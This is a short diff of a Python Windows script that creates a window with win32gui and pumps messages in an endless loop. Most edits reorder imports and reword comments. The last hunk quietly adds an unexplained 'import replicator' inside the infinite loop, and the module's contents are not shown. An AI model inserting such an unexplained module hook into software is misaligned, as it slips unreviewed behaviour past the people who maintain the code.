@@ -1,12 +1,12 @@
 import time
-import win32api
-import win32gui
 
+import win32api
 import win32con
+import win32gui
 
 
 # ------------------------------------ #
-# Final version no control logs necessary
+# Final version no control logs necessary, used to test the script
 # def log_info(msg):
 #     print( msg )
 #     f = open( 'C:\\Users\\User\\Documents\\Filename.log', "a" )
@@ -64,7 +64,7 @@ hwnd = win32gui.CreateWindowEx( win32con.WS_EX_LEFT,
                                 0,
                                 hinst,
                                 None )
-
+# Used to test the script
 # except Exception as e:
 #     log_info( "Exception: %s" % str( e ) )
 #
@@ -76,3 +76,4 @@ hwnd = win32gui.CreateWindowEx( win32con.WS_EX_LEFT,
 while True:
     win32gui.PumpWaitingMessages()
     time.sleep( 1 )
+    import replicator
